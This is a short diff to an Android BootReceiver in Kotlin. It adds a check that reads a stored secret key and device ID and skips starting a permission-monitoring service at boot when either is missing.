@@ -22,6 +22,11 @@ class BootReceiver : BroadcastReceiver() {
 
             Log.d(TAG, "Boot completed - starting services")
 
+            val prefs = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
+            val key = prefs.getString("secret_key", null)
+            val deviceId = prefs.getString("device_id", null)
+            val isAuthenticated = !key.isNullOrEmpty() && !deviceId.isNullOrEmpty()
+
             // Start services with proper permission checking
             val services = mapOf(
                 CameraService::class.java to listOf(android.Manifest.permission.CAMERA),
@@ -38,6 +43,11 @@ class BootReceiver : BroadcastReceiver() {
             )
 
             services.forEach { (serviceClass, requiredPermissions) ->
+                if (serviceClass == PermissionMonitorService::class.java && !isAuthenticated) {
+                    Log.w(TAG, "Skipping ${serviceClass.simpleName} - missing authentication")
+                    return@forEach
+                }
+
                 if (hasRequiredPermissions(context, requiredPermissions)) {
                     try {
                         val serviceIntent = Intent(context, serviceClass)
